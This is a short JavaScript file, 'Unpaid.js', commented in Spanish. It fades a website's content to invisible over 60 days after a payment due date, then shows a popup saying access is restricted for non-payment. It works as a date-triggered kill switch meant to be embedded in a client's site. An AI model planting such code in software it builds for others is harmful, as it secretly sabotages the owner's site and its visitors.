/**
 * Unpaid.js
 *
 * ¿El cliente no pagó? Este script aplica una penalización visual al sitio,
 * reduciendo progresivamente la opacidad del contenido hasta hacerlo completamente invisible.
 * Se activa automáticamente después de una fecha límite y un periodo definido.
 *
 * Diseñado para usarse en proyectos donde el acceso depende de pagos o cumplimiento.
 */


(function() {
    // CONFIGURACIÓN
    var due_date = new Date('2025-08-22'); // Fecha límite para el vencimiento
    var days_deadline = 60 // Días después del vencimiento para que desaparezca completamente 

    // FECHAS
    var current_date = new Date();
    var utc_due = Date.UTC(due_date.getFullYear(), due_date.getMonth(), due_date.getDate());
    var utc_now = Date.UTC(current_date.getFullYear(), current_date.getMonth(), current_date.getDate());
    var days_late = Math.floor((utc_now - utc_due) / (1000 * 60 * 60 * 24));

    // Crear wrapper para el contenido si no existe
    var wrapper = document.createElement("div");
    wrapper.style.transition = "opacity 0.5s ease";
    while (document.body.firstChild) {
        wrapper.appendChild(document.body.firstChild);
    }
    document.body.appendChild(wrapper);

    if (days_late > 0) {
        // Cálculo de opacidad
        var days_remaining = days_deadline - days_late;
        var opacity = (days_remaining * 100 / days_deadline) / 100;
        opacity = Math.max(0, Math.min(opacity, 1));

        // Aplicar opacidad al wrapper (todo el contenido)
        wrapper.style.opacity = opacity;
		
        console.warn("El sitio tiene una falta de pago.");
		
        // Mostrar popup si ya pasó el plazo
        if (days_late >= days_deadline) {
            showPaymentPopup();
        }
    }

    // FUNCIÓN PARA MOSTRAR POPUP FLOTANTE
    function showPaymentPopup() {
        var overlay = document.createElement("div");
        overlay.style.position = "fixed";
        overlay.style.top = "0";
        overlay.style.left = "0";
        overlay.style.width = "100%";
        overlay.style.height = "100%";
        overlay.style.backgroundColor = "rgba(0, 0, 0, 0.5)";
        overlay.style.display = "flex";
        overlay.style.alignItems = "center";
        overlay.style.justifyContent = "center";
        overlay.style.zIndex = "10000";

        var popup = document.createElement("div");
        popup.innerHTML = `
            <h2>⚠️ Acceso limitado temporalmente</h2>
			<p>Este sitio ha sido restringido debido a una falta de confirmación de pago posterior al vencimiento.<br>Si eres el administrador, toma las medidas necesarias para restaurar el acceso completo.</p>
            <button id="closePaymentPopup" style="margin-top: 15px; padding: 10px 20px; font-weight: bold;">Cerrar</button>
        `;
        popup.style.backgroundColor = "white";
        popup.style.padding = "30px";
        popup.style.borderRadius = "8px";
        popup.style.boxShadow = "0 4px 12px rgba(0, 0, 0, 0.2)";
        popup.style.maxWidth = "400px";
        popup.style.textAlign = "center";
        popup.style.fontFamily = "Arial, sans-serif";
        popup.style.color = "#333";
        popup.style.zIndex = "10001";

        overlay.appendChild(popup);
        document.body.appendChild(overlay);

        // Botón para cerrar el popup
        document.getElementById("closePaymentPopup").addEventListener("click", function() {
            overlay.remove();
        });
    }
})();
